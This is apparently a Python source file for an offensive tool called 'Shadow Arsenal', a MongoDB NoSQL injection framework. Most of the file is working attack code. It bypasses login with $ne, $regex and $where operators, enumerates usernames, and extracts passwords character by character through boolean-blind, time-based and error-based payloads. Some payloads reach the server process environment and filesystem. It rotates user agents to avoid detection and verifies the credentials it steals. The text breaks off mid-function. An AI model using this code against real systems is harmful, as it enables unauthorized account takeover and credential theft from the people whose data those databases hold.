#!/usr/bin/env python3
"""
Shadow Arsenal - Advanced NoSQL Injection Exploitation Framework
Professional Red Team Tool for MongoDB NoSQL Injection Testing

Author: Shadow Senior & Shadow Junior
Version: 3.0 Elite Edition
"""

import requests
import json
import sys
import time
import string
import argparse
import threading
import random
import re
import signal
from urllib.parse import quote, unquote
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
import itertools
import base64
import hashlib
import os

# Disable SSL warnings for pentesting
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class Colors:
    """ANSI color codes for elite terminal aesthetics"""
    RESET = '\033[0m'
    BOLD = '\033[1m'
    DIM = '\033[2m'
    
    # Primary colors
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    
    # Background colors
    BG_RED = '\033[101m'
    BG_GREEN = '\033[102m'
    BG_YELLOW = '\033[103m'
    BG_BLUE = '\033[104m'
    
    # Specialized colors for military aesthetics
    ORANGE = '\033[38;5;208m'
    PURPLE = '\033[38;5;129m'
    NEON_GREEN = '\033[38;5;46m'
    NEON_BLUE = '\033[38;5;51m'
    DARK_RED = '\033[38;5;124m'

class AdvancedNoSQLInjector:
    def __init__(self, target_ip="127.0.0.1", port=5000, threads=10, timeout=10, verbose=False):
        self.target_ip = target_ip
        self.port = port
        self.base_url = f"http://{target_ip}:{port}"
        self.threads = threads
        self.timeout = timeout
        self.verbose = verbose
        
        # Advanced session with custom headers for stealth
        self.session = requests.Session()
        self.session.verify = False
        self.setup_stealth_headers()
        
        # Results storage
        self.extracted_users = {}
        self.injection_points = []
        self.database_info = {}
        
        # Animation control
        self.stop_animation = False
        self.animation_thread = None
        
        # Enhanced payloads
        self.blind_payloads = self.generate_advanced_payloads()
        
        # Signal handler for graceful exit
        signal.signal(signal.SIGINT, self.signal_handler)
    
    def signal_handler(self, sig, frame):
        """Handle Ctrl+C gracefully"""
        print(f"\n{Colors.YELLOW}[!] Received interrupt signal. Cleaning up...{Colors.RESET}")
        self.stop_animation = True
        if self.animation_thread:
            self.animation_thread.join(timeout=1)
        sys.exit(0)
    
    def setup_stealth_headers(self):
        """Setup realistic headers to avoid detection"""
        user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0"
        ]
        
        self.session.headers.update({
            'User-Agent': random.choice(user_agents),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
        })
    
    def generate_advanced_payloads(self):
        """Generate advanced NoSQL injection payloads"""
        return {
            'boolean_blind': [
                {"$ne": None},
                {"$ne": ""},
                {"$exists": True},
                {"$regex": ".*"},
                {"$where": "1==1"},
                {"$where": "return true"},
                {"$gt": ""},
                {"$gte": ""},
                {"$in": [""]},
                {"$nin": ["impossible_value_xyz123"]},
            ],
            'error_based': [
                {"$where": "function() { throw new Error('NoSQL Injection'); }"},
                {"$where": "this.constructor.constructor('return process')().env"},
                {"$regex": "/.*/$invalid"},
            ],
            'time_based': [
                {"$where": "sleep(3000) || true"},
                {"$where": "function() { var start = new Date(); while(new Date() - start < 3000) {} return true; }"},
                {"$where": "this.constructor.constructor('return Date')().now() && sleep(3000)"},
            ],
            'union_based': [
                {"$or": [{"username": {"$exists": True}}, {"password": {"$exists": True}}]},
                {"$and": [{"$where": "1==1"}, {"$ne": "impossible"}]},
            ]
        }
    
    def elite_banner(self):
        """Display elite military-style banner"""
        banner = f"""
{Colors.DARK_RED}╔═══════════════════════════════════════════════════════════════════════════════╗{Colors.RESET}
{Colors.DARK_RED}║{Colors.RESET} {Colors.NEON_GREEN}███████{Colors.RESET} {Colors.WHITE}██{Colors.RESET}  {Colors.WHITE}██{Colors.RESET} {Colors.NEON_GREEN}█████{Colors.RESET}  {Colors.NEON_GREEN}██████{Colors.RESET}  {Colors.NEON_GREEN}██████{Colors.RESET} {Colors.WHITE}██{Colors.RESET}    {Colors.WHITE}██{Colors.RESET} {Colors.NEON_GREEN}███████{Colors.RESET} {Colors.DARK_RED}║{Colors.RESET}
{Colors.DARK_RED}║{Colors.RESET} {Colors.NEON_GREEN}██{Colors.RESET}      {Colors.WHITE}██{Colors.RESET}  {Colors.WHITE}██{Colors.RESET} {Colors.NEON_GREEN}██{Colors.RESET}   {Colors.NEON_GREEN}██{Colors.RESET} {Colors.NEON_GREEN}██{Colors.RESET}   {Colors.NEON_GREEN}██{Colors.RESET} {Colors.NEON_GREEN}██{Colors.RESET}   {Colors.NEON_GREEN}██{Colors.RESET} {Colors.WHITE}██{Colors.RESET}    {Colors.WHITE}██{Colors.RESET} {Colors.NEON_GREEN}██{Colors.RESET}      {Colors.DARK_RED}║{Colors.RESET}
{Colors.DARK_RED}║{Colors.RESET} {Colors.NEON_GREEN}███████{Colors.RESET} {Colors.WHITE}██████{Colors.RESET}  {Colors.NEON_GREEN}███████{Colors.RESET} {Colors.NEON_GREEN}██{Colors.RESET}   {Colors.NEON_GREEN}██{Colors.RESET} {Colors.NEON_GREEN}██{Colors.RESET}   {Colors.NEON_GREEN}██{Colors.RESET} {Colors.WHITE}██{Colors.RESET}    {Colors.WHITE}██{Colors.RESET} {Colors.NEON_GREEN}███████{Colors.RESET} {Colors.DARK_RED}║{Colors.RESET}
{Colors.DARK_RED}║{Colors.RESET}      {Colors.NEON_GREEN}██{Colors.RESET} {Colors.WHITE}██{Colors.RESET}  {Colors.WHITE}██{Colors.RESET} {Colors.NEON_GREEN}██{Colors.RESET}   {Colors.NEON_GREEN}██{Colors.RESET} {Colors.NEON_GREEN}██{Colors.RESET}   {Colors.NEON_GREEN}██{Colors.RESET} {Colors.NEON_GREEN}██{Colors.RESET}   {Colors.NEON_GREEN}██{Colors.RESET} {Colors.WHITE}██{Colors.RESET}    {Colors.WHITE}██{Colors.RESET}      {Colors.NEON_GREEN}██{Colors.RESET} {Colors.DARK_RED}║{Colors.RESET}
{Colors.DARK_RED}║{Colors.RESET} {Colors.NEON_GREEN}███████{Colors.RESET} {Colors.WHITE}██{Colors.RESET}  {Colors.WHITE}██{Colors.RESET} {Colors.NEON_GREEN}██{Colors.RESET}   {Colors.NEON_GREEN}██{Colors.RESET} {Colors.NEON_GREEN}██████{Colors.RESET}  {Colors.NEON_GREEN}██████{Colors.RESET}   {Colors.WHITE}██████{Colors.RESET}  {Colors.NEON_GREEN}███████{Colors.RESET} {Colors.DARK_RED}║{Colors.RESET}
{Colors.DARK_RED}╠═══════════════════════════════════════════════════════════════════════════════╣{Colors.RESET}
{Colors.DARK_RED}║{Colors.RESET}           {Colors.PURPLE}Advanced NoSQL Injection Exploitation Framework{Colors.RESET}              {Colors.DARK_RED}║{Colors.RESET}
{Colors.DARK_RED}║{Colors.RESET}              {Colors.CYAN}Professional Red Team Arsenal - v3.0 Elite{Colors.RESET}                {Colors.DARK_RED}║{Colors.RESET}
{Colors.DARK_RED}╚═══════════════════════════════════════════════════════════════════════════════╝{Colors.RESET}

{Colors.ORANGE}[◢] TARGET ACQUIRED:{Colors.RESET} {Colors.WHITE}{self.base_url}{Colors.RESET}
{Colors.ORANGE}[◢] THREADS:{Colors.RESET} {Colors.WHITE}{self.threads}{Colors.RESET} {Colors.ORANGE}| TIMEOUT:{Colors.RESET} {Colors.WHITE}{self.timeout}s{Colors.RESET} {Colors.ORANGE}| STEALTH MODE:{Colors.RESET} {Colors.NEON_GREEN}ACTIVE{Colors.RESET}
{Colors.ORANGE}[◢] MISSION:{Colors.RESET} {Colors.WHITE}MongoDB NoSQL Injection & Credential Extraction{Colors.RESET}
"""
        print(banner)
    
    def animated_status(self, message, duration=None):
        """Display animated status with military-style indicators"""
        symbols = ['◐', '◓', '◑', '◒']
        colors = [Colors.NEON_GREEN, Colors.CYAN, Colors.YELLOW, Colors.ORANGE]
        
        if duration:
            end_time = time.time() + duration
            while time.time() < end_time and not self.stop_animation:
                for i, symbol in enumerate(symbols):
                    if self.stop_animation:
                        break
                    color = colors[i % len(colors)]
                    print(f"\r{color}[{symbol}]{Colors.RESET} {message}", end='', flush=True)
                    time.sleep(0.2)
        else:
            i = 0
            while not self.stop_animation:
                symbol = symbols[i % len(symbols)]
                color = colors[i % len(colors)]
                print(f"\r{color}[{symbol}]{Colors.RESET} {message}", end='', flush=True)
                time.sleep(0.2)
                i += 1
    
    def log_success(self, message):
        """Log success message with elite styling"""
        print(f"{Colors.NEON_GREEN}[✓]{Colors.RESET} {Colors.WHITE}{message}{Colors.RESET}")
    
    def log_info(self, message):
        """Log info message with elite styling"""
        print(f"{Colors.CYAN}[◢]{Colors.RESET} {Colors.WHITE}{message}{Colors.RESET}")
    
    def log_warning(self, message):
        """Log warning message with elite styling"""
        print(f"{Colors.YELLOW}[!]{Colors.RESET} {Colors.WHITE}{message}{Colors.RESET}")
    
    def log_error(self, message):
        """Log error message with elite styling"""
        print(f"{Colors.RED}[✗]{Colors.RESET} {Colors.WHITE}{message}{Colors.RESET}")
    
    def test_connection(self):
        """Advanced connection testing with stealth"""
        self.log_info("Initiating target reconnaissance...")
        
        # Start animation
        self.stop_animation = False
        self.animation_thread = threading.Thread(
            target=self.animated_status, 
            args=("Probing target infrastructure...",)
        )
        self.animation_thread.daemon = True
        self.animation_thread.start()
        
        try:
            # Test multiple endpoints for better reconnaissance
            endpoints = ['/login', '/api/users', '/health', '/']
            accessible_endpoints = []
            
            for endpoint in endpoints:
                try:
                    response = self.session.get(f"{self.base_url}{endpoint}", timeout=self.timeout)
                    if response.status_code < 500:
                        accessible_endpoints.append(f"{endpoint} ({response.status_code})")
                        
                        # Analyze response for MongoDB indicators
                        if any(indicator in response.text.lower() for indicator in ['mongodb', 'nosql', 'mongoose', '$ne', '$regex']):
                            self.database_info['mongodb_indicators'] = True
                            
                except requests.exceptions.RequestException:
                    continue
            
            self.stop_animation = True
            if self.animation_thread:
                self.animation_thread.join(timeout=1)
            
            if accessible_endpoints:
                self.log_success(f"Target acquired - {len(accessible_endpoints)} endpoints discovered")
                if self.verbose:
                    for endpoint in accessible_endpoints:
                        print(f"  {Colors.DIM}├─ {endpoint}{Colors.RESET}")
                return True
            else:
                self.log_error("Target unreachable - all endpoints failed")
                return False
                
        except Exception as e:
            self.stop_animation = True
            if self.animation_thread:
                self.animation_thread.join(timeout=1)
            self.log_error(f"Connection test failed: {str(e)}")
            return False
    
    def discover_injection_points(self):
        """Discover injection points across the application"""
        self.log_info("Scanning for NoSQL injection vectors...")
        
        # Common injection endpoints
        test_endpoints = [
            {'url': '/login', 'method': 'POST', 'data_type': 'json'},
            {'url': '/api/users', 'method': 'GET', 'data_type': 'params'},
            {'url': '/search', 'method': 'GET', 'data_type': 'params'},
            {'url': '/files', 'method': 'GET', 'data_type': 'params'},
        ]
        
        discovered_points = []
        
        for endpoint in test_endpoints:
            if self.test_injection_point(endpoint):
                discovered_points.append(endpoint)
                self.log_success(f"Injection point discovered: {endpoint['method']} {endpoint['url']}")
        
        self.injection_points = discovered_points
        return len(discovered_points) > 0
    
    def test_injection_point(self, endpoint):
        """Test a specific endpoint for NoSQL injection vulnerability"""
        url = self.base_url + endpoint['url']
        
        # Test payloads for detection
        test_payloads = [
            {"username": {"$ne": None}, "password": {"$ne": None}},
            {"q": {"$where": "1==1"}},
            {"search": {"$regex": ".*"}},
        ]
        
        for payload in test_payloads:
            try:
                if endpoint['method'] == 'POST':
                    if endpoint['data_type'] == 'json':
                        response = self.session.post(url, json=payload, timeout=self.timeout)
                    else:
                        response = self.session.post(url, data=payload, timeout=self.timeout)
                else:
                    response = self.session.get(url, params=payload, timeout=self.timeout)
                
                # Analyze response for injection success indicators
                if (response.status_code == 200 and 
                    any(indicator in response.text.lower() for indicator in 
                        ['dashboard', 'welcome', 'profile', 'success', 'users', 'admin'])):
                    return True
                    
            except requests.exceptions.RequestException:
                continue
        
        return False
    
    def extract_usernames_advanced(self):
        """Advanced username enumeration using multiple techniques"""
        self.log_info("Initiating advanced username enumeration...")
        
        discovered_users = set()
        techniques = [
            self.enum_users_boolean_blind,
            self.enum_users_regex_based,
            self.enum_users_error_based,
        ]
        
        # Execute techniques in parallel
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = [executor.submit(technique) for technique in techniques]
            
            for future in as_completed(futures):
                try:
                    users = future.result()
                    if users:
                        discovered_users.update(users)
                except Exception as e:
                    if self.verbose:
                        self.log_warning(f"Enumeration technique failed: {str(e)}")
        
        # Convert to list and add common fallback usernames
        usernames = list(discovered_users)
        if not usernames:
            # Only add essential test usernames - remove hardcoded ones
            fallback_users = ['admin', 'test', 'developer']
            self.log_warning("No users discovered via injection - using minimal fallback list")
            usernames = fallback_users
        
        self.log_success(f"Username enumeration complete: {len(usernames)} users identified")
        if self.verbose:
            for user in usernames:
                print(f"  {Colors.DIM}├─ {user}{Colors.RESET}")
        
        return usernames
    
    def enum_users_boolean_blind(self):
        """Boolean-based blind username enumeration"""
        login_url = f"{self.base_url}/login"
        headers = {"Content-Type": "application/json"}
        discovered_users = set()
        
        # Character set for username enumeration
        charset = string.ascii_lowercase + string.digits + '_-.'
        
        # Try to determine approximate number of users
        user_count = self.estimate_user_count()
        
        # Enumerate users by length first, then by characters
        for length in range(3, 20):  # Reasonable username lengths
            for attempt in range(min(user_count, 10)):  # Limit attempts
                username = self.extract_username_blind(length, charset, headers, login_url)
                if username and len(username) >= 3:
                    discovered_users.add(username)
                    if len(discovered_users) >= 20:  # Reasonable limit
                        break
            if len(discovered_users) >= 20:
                break
        
        return list(discovered_users)
    
    def estimate_user_count(self):
        """Estimate the number of users in the database"""
        login_url = f"{self.base_url}/login"
        headers = {"Content-Type": "application/json"}
        
        for count in range(1, 50):
            payload = {
                "username": {"$where": f"db.users.count() >= {count}"},
                "password": {"$ne": None}
            }
            
            try:
                response = self.session.post(login_url, headers=headers, json=payload, timeout=5)
                if not (response.status_code == 200 and "dashboard" in response.text.lower()):
                    return max(count - 1, 5)  # Return previous count or minimum 5
            except:
                continue
        
        return 10  # Default reasonable estimate
    
    def extract_username_blind(self, target_length, charset, headers, login_url):
        """Extract a username of specific length using blind injection"""
        username = ""
        
        for position in range(target_length):
            found_char = False
            
            # Randomize character order to avoid patterns
            shuffled_charset = list(charset)
            random.shuffle(shuffled_charset)
            
            for char in shuffled_charset:
                test_username = username + char
                
                # Multiple payload variations for robustness
                payloads = [
                    {
                        "username": {"$regex": f"^{re.escape(test_username)}", "$options": "i"},
                        "password": {"$ne": None}
                    },
                    {
                        "username": {"$where": f"this.username.substring(0, {len(test_username)}) == '{test_username.replace('\'', '\\\'')}'"},
                        "password": {"$ne": None}
                    }
                ]
                
                for payload in payloads:
                    try:
                        response = self.session.post(login_url, headers=headers, json=payload, timeout=5)
                        if response.status_code == 200 and "dashboard" in response.text.lower():
                            username = test_username
                            found_char = True
                            break
                    except:
                        continue
                
                if found_char:
                    break
            
            if not found_char:
                break
        
        return username if len(username) >= 3 else None
    
    def enum_users_regex_based(self):
        """Regex-based username enumeration"""
        login_url = f"{self.base_url}/login"
        headers = {"Content-Type": "application/json"}
        discovered_users = set()
        
        # Common username patterns
        patterns = [
            r'^a[a-z]*',  # Usernames starting with 'a'
            r'^[a-z]{4,}',  # Usernames with 4+ characters
            r'.*admin.*',  # Admin-related usernames
            r'.*test.*',   # Test-related usernames
            r'.*dev.*',    # Developer-related usernames
        ]
        
        for pattern in patterns:
            payload = {
                "username": {"$regex": pattern, "$options": "i"},
                "password": {"$ne": None}
            }
            
            try:
                response = self.session.post(login_url, headers=headers, json=payload, timeout=self.timeout)
                if response.status_code == 200 and "dashboard" in response.text.lower():
                    # If successful, try to extract the specific username
                    extracted = self.extract_from_regex_match(pattern)
                    if extracted:
                        discovered_users.update(extracted)
            except:
                continue
        
        return list(discovered_users)
    
    def extract_from_regex_match(self, pattern):
        """Extract specific usernames from successful regex match"""
        # This would need to be implemented based on specific application behavior
        # For now, return empty set as it's complex without more application context
        return set()
    
    def enum_users_error_based(self):
        """Error-based username enumeration"""
        login_url = f"{self.base_url}/login"
        headers = {"Content-Type": "application/json"}
        
        # Error-inducing payloads that might reveal information
        error_payloads = [
            {"username": {"$where": "this.username.constructor.constructor('return process')().mainModule.require('fs').readdirSync('.')"}, "password": {"$ne": None}},
            {"username": {"$where": "function() { throw new Error(JSON.stringify(db.users.findOne())); }"}, "password": {"$ne": None}},
        ]
        
        discovered_info = []
        
        for payload in error_payloads:
            try:
                response = self.session.post(login_url, headers=headers, json=payload, timeout=self.timeout)
                # Analyze error messages for leaked information
                if response.status_code >= 400 and len(response.text) > 100:
                    discovered_info.append(response.text)
            except:
                continue
        
        # Parse error messages for usernames (simplified implementation)
        return []
    
    def extract_password_advanced(self, username):
        """Advanced password extraction using multiple techniques"""
        self.log_info(f"Extracting credentials for: {Colors.YELLOW}{username}{Colors.RESET}")
        
        # Try different extraction methods
        methods = [
            ('Boolean Blind', self.extract_password_boolean_blind),
            ('Time-Based', self.extract_password_time_based),
            ('Error-Based', self.extract_password_error_based),
        ]
        
        for method_name, method_func in methods:
            try:
                self.log_info(f"Attempting {method_name} extraction...")
                password = method_func(username)
                if password:
                    self.log_success(f"Password extracted via {method_name}: {Colors.NEON_GREEN}{password}{Colors.RESET}")
                    return password
            except Exception as e:
                if self.verbose:
                    self.log_warning(f"{method_name} failed: {str(e)}")
                continue
        
        return None
    
    def extract_password_boolean_blind(self, username):
        """Boolean-based blind password extraction"""
        login_url = f"{self.base_url}/login"
        headers = {"Content-Type": "application/json"}
        
        # Enhanced character set for real-world passwords
        charset = string.ascii_letters + string.digits + '!@#$%^&*()_+-=[]{}|;:,.<>?'
        password = ""
        
        # Optimize by checking common password patterns first
        common_starts = ['P', 'p', 'A', 'a', 'T', 't', '1', '2']
        
        for max_length in [8, 12, 16, 20, 32]:  # Try different password lengths
            temp_password = ""
            
            for position in range(max_length):
                found_char = False
                
                # Try common starting characters first if it's the beginning
                test_chars = common_starts if position == 0 else list(charset)
                if position > 0:
                    random.shuffle(test_chars)
                
                for char in test_chars:
                    test_password = temp_password + char
                    
                    # Multiple payload techniques
                    payloads = [
                        {
                            "username": username,
                            "password": {"$regex": f"^{re.escape(test_password)}"}
                        },
                        {
                            "username": username,
                            "password": {"$where": f"this.password.substring(0, {len(test_password)}) === '{test_password.replace('\'', '\\\'')}'"}
                        }
                    ]
                    
                    for payload in payloads:
                        try:
                            response = self.session.post(login_url, headers=headers, json=payload, timeout=7)
                            if response.status_code == 200 and "dashboard" in response.text.lower():
                                temp_password = test_password
                                found_char = True
                                break
                        except:
                            continue
                    
                    if found_char:
                        break
                
                if not found_char:
                    break
            
            if len(temp_password) >= 6:  # Reasonable minimum password length
                return temp_password
        
        return None
    
    def extract_password_time_based(self, username):
        """Time-based blind password extraction"""
        login_url = f"{self.base_url}/login"
        headers = {"Content-Type": "application/json"}
        charset = string.ascii_letters + string.digits + '!@#$%^&*()_+-='
        password = ""
        
        for position in range(25):  # Max password length
            found_char = False
            
            for char in charset:
                # Time-based payload with sleep
                payload = {
                    "username": username,
                    "password": {
                        "$where": f"if (this.password.charAt({position}) == '{char.replace('\'', '\\\'')}') {{ var start = new Date(); while(new Date() - start < 2000) {{}} return true; }} else {{ return false; }}"
                    }
                }
                
                try:
                    start_time = time.time()
                    response = self.session.post(login_url, headers=headers, json=payload, timeout=4)
                    elapsed = time.time() - start_time
                    
                    if elapsed > 1.5:  # Significant delay
                        password += char
                        found_char = True
                        break
                        
                except requests.exceptions.Timeout:
                    # Timeout indicates successful character match
                    password += char
                    found_char = True
                    break
                except:
                    continue
            
            if not found_char:
                break
        
        return password if len(password) >= 6 else None
    
    def extract_password_error_based(self, username):
        """Error-based password extraction"""
        login_url = f"{self.base_url}/login"
        headers = {"Content-Type": "application/json"}
        
        # Error-based payloads that might leak password information
        error_payloads = [
            {
                "username": username,
                "password": {"$where": f"function() {{ throw new Error('Password: ' + this.password); }}"}
            },
            {
                "username": username,
                "password": {"$where": f"this.password.constructor.constructor('throw new Error(this.password)')()"}
            }
        ]
        
        for payload in error_payloads:
            try:
                response = self.session.post(login_url, headers=headers, json=payload, timeout=self.timeout)
                
                # Look for password in error messages
                if response.status_code >= 400:
                    # Simple pattern matching for leaked passwords
                    error_text = response.text
                    password_patterns = [
                        r'Password:\s*([^\s\'"]+)',
                        r'"password":\s*"([^"]+)"',
                        r'password=([^\s&]+)',
                    ]
                    
                    for pattern in password_patterns:
                        match = re.search(pattern, error_text, re.IGNORECASE)
                        if match:
                            return match.group(1)
            except:
                continue
        
        return None
    
    def parallel_password_extraction(self, usernames):
        """Extract passwords for multiple users in parallel"""
        self.log_info(f"Initiating parallel credential extraction for {len(usernames)} targets...")
        
        results = {}
        
        # Start animated status
        self.stop_animation = False
        status_thread = threading.Thread(
            target=self.animated_status,
            args=("Extracting credentials from database...",)
        )
        status_thread.daemon = True
        status_thread.start()
        
        # Use ThreadPoolExecutor for parallel processing
        with ThreadPoolExecutor(max_workers=min(self.threads, len(usernames))) as executor:
            # Submit extraction tasks
            future_to_username = {
                executor.submit(self.extract_password_advanced, username): username
                for username in usernames
            }
            
            # Collect results
            completed = 0
            for future in as_completed(future_to_username):
                username = future_to_username[future]
                try:
                    password = future.result()
                    if password:
                        results[username] = password
                except Exception as e:
                    if self.verbose:
                        self.log_warning(f"Extraction failed for {username}: {str(e)}")
                
                completed += 1
                if completed % 3 == 0:  # Update progress
                    self.stop_animation = True
                    if status_thread.is_alive():
                        status_thread.join(timeout=0.1)
                    
                    progress = (completed / len(usernames)) * 100
                    self.log_info(f"Progress: {progress:.1f}% ({completed}/{len(usernames)})")
                    
                    self.stop_animation = False
                    status_thread = threading.Thread(
                        target=self.animated_status,
                        args=("Continuing credential extraction...",)
                    )
                    status_thread.daemon = True
                    status_thread.start()
        
        # Stop animation
        self.stop_animation = True
        if status_thread.is_alive():
            status_thread.join(timeout=1)
        
        return results
    
    def verify_credentials(self, credentials):
        """Verify extracted credentials by attempting login"""
        self.log_info("Verifying extracted credentials...")
        
        login_url = f"{self.base_url}/login"
        headers = {"Content-Type": "application/json"}
        verified_creds = {}
        
        for username, password in credentials.items():
            payload = {
                "username": username,
                "password": password
            }
            
            try:
                response = self.session.post(login_url, headers=headers, json=payload, timeout=self.timeout)
                if response.status_code == 200 and "dashboard" in response.text.lower():
                    verified_creds[username] = password
                    self.log_success(f"Verified: {Colors.CYAN}{username}{Colors.RESET}:{Colors.NEON_GREEN}{password}{Colors.RESET}")
                else:
                    self.log_warning(f"Failed verification: {username}:{password}")
            except Exception as e:
                if self.verbose:
                    self.log_error(f"Verification error for {username}: {str(e)}")
        
        return verified_creds
    
    def generate_report(self, results, output_file=None):
        """Generate comprehensive penetration testing report"""
        if not output_file:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            output_file = f"nosql_injection_report_{timestamp}.txt"
        
        report_content = f"""
{'='*80}
SHADOW ARSENAL - NOSQL INJECTION PENETRATION TEST REPORT
{'='*80}

TARGET INFORMATION:
├─ URL: {self.base_url}
├─ Scan Date: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
├─ Threads Used: {self.threads}
└─ Timeout: {self.timeout}s

VULNERABILITY ASSESSMENT:
├─ Injection Points Discovered: {len(self.injection_points)}
├─ Users Enumerated: {len(results)}
├─ Credentials Extracted: {len([k for k, v in results.items() if v])}
└─ Success Rate: {(len([k for k, v in results.items() if v]) / max(len(results), 1) * 100):.1f}%

EXTRACTED CREDENTIALS:
"""
        
        if results:
            for username, password in results.items():
                if password:
                    report_content += f"├─ {username}:{password}\n"
                else:
                    report_content += f"├─ {username}:[EXTRACTION_FAILED]\n"
        else:
            report_content += "└─ No credentials successfully extracted\n"
        
        report_content += f"""
INJECTION POINTS IDENTIFIED:
"""
        
        for i, point in enumerate(self.injection_points):
            prefix = "├─" if i < len(self.injection_points) - 1 else "└─"
            report_content += f"{prefix} {point['method']} {point['url']} ({point['data_type']})\n"
        
        report_content += f"""
RECOMMENDATIONS:
├─ Implement input validation and sanitization
├─ Use parameterized queries with MongoDB
├─ Deploy Web Application Firewall (WAF)
├─ Enable MongoDB authentication and authorization
├─ Implement rate limiting on authentication endpoints
├─ Use HTTPS for all communications
├─ Regular security audits and penetration testing
└─ Employee security awareness training

TECHNICAL DETAILS:
├─ NoSQL Injection Types Tested: Boolean Blind, Time-Based, Error-Based
├─ User Agent: {self.session.headers.get('User-Agent', 'N/A')}
├─ Request Timeout: {self.timeout}s
└─ Concurrent Threads: {self.threads}

{'='*80}
Report generated by Shadow Arsenal v3.0 Elite
Professional Red Team NoSQL Injection Framework
{'='*80}
"""
        
        try:
            with open(output_file, 'w') as f:
                f.write(report_content)
            self.log_success(f"Detailed report saved: {Colors.CYAN}{output_file}{Colors.RESET}")
        except Exception as e:
            self.log_error(f"Failed to save report: {str(e)}")
        
        return output_file
    
    def display_results(self, results):
        """Display results with elite terminal aesthetics"""
        print(f"\n{Colors.DARK_RED}╔═══════════════════════════════════════════════════════════════════════════════╗{Colors.RESET}")
        print(f"{Colors.DARK_RED}║{Colors.RESET}                        {Colors.NEON_GREEN}CREDENTIAL EXTRACTION RESULTS{Colors.RESET}                        {Colors.DARK_RED}║{Colors.RESET}")
        print(f"{Colors.DARK_RED}╠═══════════════════════════════════════════════════════════════════════════════╣{Colors.RESET}")
        
        if results:
            successful_extractions = {k: v for k, v in results.items() if v}
            failed_extractions = {k: v for k, v in results.items() if not v}
            
            if successful_extractions:
                print(f"{Colors.DARK_RED}║{Colors.RESET} {Colors.NEON_GREEN}SUCCESSFULLY EXTRACTED CREDENTIALS:{Colors.RESET}                                      {Colors.DARK_RED}║{Colors.RESET}")
                print(f"{Colors.DARK_RED}║{Colors.RESET}                                                                               {Colors.DARK_RED}║{Colors.RESET}")
                
                for i, (username, password) in enumerate(successful_extractions.items()):
                    is_last = i == len(successful_extractions) - 1 and not failed_extractions
                    prefix = "└─" if is_last else "├─"
                    
                    # Truncate long passwords for display
                    display_password = password[:30] + "..." if len(password) > 30 else password
                    line = f"{Colors.DARK_RED}║{Colors.RESET} {Colors.CYAN}{prefix}{Colors.RESET} {Colors.WHITE}{username:<20}{Colors.RESET} : {Colors.NEON_GREEN}{display_password:<35}{Colors.RESET} {Colors.DARK_RED}║{Colors.RESET}"
                    print(line)
            
            if failed_extractions:
                if successful_extractions:
                    print(f"{Colors.DARK_RED}║{Colors.RESET}                                                                               {Colors.DARK_RED}║{Colors.RESET}")
                
                print(f"{Colors.DARK_RED}║{Colors.RESET} {Colors.YELLOW}EXTRACTION FAILED:{Colors.RESET}                                                        {Colors.DARK_RED}║{Colors.RESET}")
                print(f"{Colors.DARK_RED}║{Colors.RESET}                                                                               {Colors.DARK_RED}║{Colors.RESET}")
                
                for i, username in enumerate(failed_extractions.keys()):
                    is_last = i == len(failed_extractions) - 1
                    prefix = "└─" if is_last else "├─"
                    line = f"{Colors.DARK_RED}║{Colors.RESET} {Colors.YELLOW}{prefix}{Colors.RESET} {Colors.WHITE}{username:<20}{Colors.RESET} : {Colors.RED}[EXTRACTION_FAILED]{Colors.RESET}                {Colors.DARK_RED}║{Colors.RESET}"
                    print(line)
        else:
            print(f"{Colors.DARK_RED}║{Colors.RESET} {Colors.RED}NO CREDENTIALS EXTRACTED{Colors.RESET}                                                {Colors.DARK_RED}║{Colors.RESET}")
            print(f"{Colors.DARK_RED}║{Colors.RESET} {Colors.YELLOW}Consider manual testing or alternative attack vectors{Colors.RESET}                     {Colors.DARK_RED}║{Colors.RESET}")
        
        print(f"{Colors.DARK_RED}╚═══════════════════════════════════════════════════════════════════════════════╝{Colors.RESET}")
        
        # Statistics
        total_users = len(results)
        successful_count = len([k for k, v in results.items() if v])
        success_rate = (successful_count / max(total_users, 1)) * 100
        
        print(f"\n{Colors.ORANGE}[◢] MISSION STATISTICS:{Colors.RESET}")
        print(f"    {Colors.WHITE}Total Targets:{Colors.RESET} {total_users}")
        print(f"    {Colors.WHITE}Successful Extractions:{Colors.RESET} {successful_count}")
        print(f"    {Colors.WHITE}Success Rate:{Colors.RESET} {success_rate:.1f}%")
        print(f"    {Colors.WHITE}Injection Points:{Colors.RESET} {len(self.injection_points)}")
    
    def run_comprehensive_assessment(self):
        """Execute comprehensive NoSQL injection assessment"""
        self.elite_banner()
        
        # Phase 1: Connection and reconnaissance
        if not self.test_connection():
            self.log_error("Target assessment failed - aborting mission")
            return False
        
        # Phase 2: Injection point discovery
        self.log_info("Phase 2: Injection point reconnaissance")
        if not self.discover_injection_points():
            self.log_warning("No obvious injection points found - proceeding with standard endpoints")
        
        # Phase 3: Username enumeration
        self.log_info("Phase 3: Target enumeration")
        usernames = self.extract_usernames_advanced()
        
        if not usernames:
            self.log_error("No usernames discovered - mission aborted")
            return False
        
        # Phase 4: Credential extraction
        self.log_info("Phase 4: Credential extraction")
        results = self.parallel_password_extraction(usernames)
        
        # Phase 5: Credential verification
        if results:
            verified_results = self.verify_credentials(results)
            results.update(verified_results)  # Update with verification status
        
        # Phase 6: Results and reporting
        self.display_results(results)
        
        # Generate report
        report_file = self.generate_report(results)
        
